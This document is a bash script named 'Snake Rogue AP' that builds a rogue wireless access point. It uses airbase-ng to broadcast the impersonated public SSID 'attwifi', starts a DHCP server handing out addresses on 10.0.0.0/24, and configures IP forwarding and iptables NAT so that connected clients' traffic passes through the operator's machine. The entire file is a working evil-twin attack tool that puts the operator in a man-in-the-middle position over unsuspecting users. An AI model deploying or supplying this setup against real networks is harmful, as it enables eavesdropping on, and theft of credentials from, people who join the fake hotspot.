#!/bin/bash

#CREATE VARS
ICI=
API=

trap cleanupfn SIGHUP SIGINT SIGTERM

startupfn()
{
    resetfn
    clear
    killprocfn
    clear
    echo "**************Snake Rogue AP********************"
    echo "Requires Iptables, isc-dhcp-server, and the Aircrack-ng suite"
    echo "************************************************"
    echo -e "\n"
    echo -e "\n"
    read -n 1 -p "Press any Key to Continue..."
    clear
    resetamfn
    clear
    echo "Select Internet Connected Interface"
    ifconfig -a | grep eth | awk '{ print $1"   "$5 }' 2>/dev/null                
    ifconfig -a | grep wlan | awk '{ print $1"   "$5 }'
    read ICI
    echo "Select AP Interface"
    read API
    clear
    echo "Enabling IP Forwarding"
    echo '1' > /proc/sys/net/ipv4/ip_forward
    echo "Starting Monitor Mode on $API"
    airmon-ng start $API &> /dev/null
    sleep 5
    API=$API"mon"
}

iptablesfn()
{
    ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 #dish out ip to at0
    route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 #add route indicate router
    iptables -P FORWARD ACCEPT
    iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE #connect at0 to internet
}

killprocfn()
{
     echo "Killing Interfering Processes"
     airmon-ng check kill &> /dev/null
     sleep 3
}

resetfn()
{
    echo "Flushing and Resetting IpTables..."
    iptables --flush    # delete all rules in default (filter) table
    iptables -t nat --flush
    iptables -t mangle --flush
    #iptables -X         # delete user-defined chains
    #iptables -t nat -X
    #iptables -t mangle -X
    iptables --delete-chain
    iptables --table nat --delete-chain
    echo "Disabling IP Forwarding..."
    echo '0' > /proc/sys/net/ipv4/ip_forward
    sleep 1
}

startdhcpfn()
{
    echo > /var/lib/dhcp/dhcpd.leases #clear dhcp leases
    echo > /tmp/dhcpd.conf
    echo "Clearing Lease File"
    echo "Generating /tmp/dhcpd.conf"
    echo "Starting DHCP server..."
    echo "default-lease-time 300;"> /tmp/dhcpd.conf
    echo "max-lease-time 360;" >> /tmp/dhcpd.conf
    echo "ddns-update-style none;" >> /tmp/dhcpd.conf
    echo "authoritative;" >> /tmp/dhcpd.conf
    echo "log-facility local7;" >> /tmp/dhcpd.conf
    echo "subnet 10.0.0.0 netmask 255.255.255.0 {" >> /tmp/dhcpd.conf
    echo "range 10.0.0.2 10.0.0.254;" >> /tmp/dhcpd.conf
    echo "option routers 10.0.0.1;" >> /tmp/dhcpd.conf
    echo "option domain-name-servers 8.8.8.8;" >> /tmp/dhcpd.conf
    echo "}"  >> /tmp/dhcpd.conf
    #dhcpd -cf /tmp/dhcpd.conf at0 &> /dev/null 
    xterm -hold -T "DHCP" -e dhcpd -d -f -cf /tmp/dhcpd.conf at0 2> /dev/null 2> /dev/null & clear
    xterm -hold -T "DHCP LEASES" -e tail /var/lib/dhcp/dhcpd.leases 2> /dev/null 2> /dev/null & clear #open new terminal window
    sleep 1
}

startapfn()
{
    xterm -hold -T "AIRBASE" -e airbase-ng -e attwifi -v $API 2> /dev/null 2> /dev/null & clear #open airbase in new window
    sleep 3 #Sleep for at0 to be created
    iptablesfn

}

cleanupfn() #Checks pids first, then kills processes, and exits
{
    clear
    #Take care of dhcpd
    PID=$(pidof dhcpd)
    if [ -n "$PID" ]; then
    echo "DHCPD has PID: $PID"
    echo "Killing DHCPD"
    kill $PID
    sleep 1
    fi

    resetamfn
    resetfn
    sleep 3
    echo "All Clean, Boss!"
    sleep 1
    clear
    exit 0
}

resetamfn()
{
    echo "Closing any Monitor Interfaces..."
    airmon-ng stop wlan0mon &> /dev/null #Stop previous monitor interfaces
    airmon-ng stop wlan1mon &> /dev/null #Three should be enough...
    airmon-ng stop wlan2mon &> /dev/null #Who has more than 3 cards at a time?
    airmon-ng stop wlan3mon &> /dev/null
    echo "Bringing Down AT0"
    ifconfig at0 down &> /dev/null
    
    sleep 3
}

startupfn
startapfn
startdhcpfn
read -n 1 -p "Press any Key to Continue..."                                             
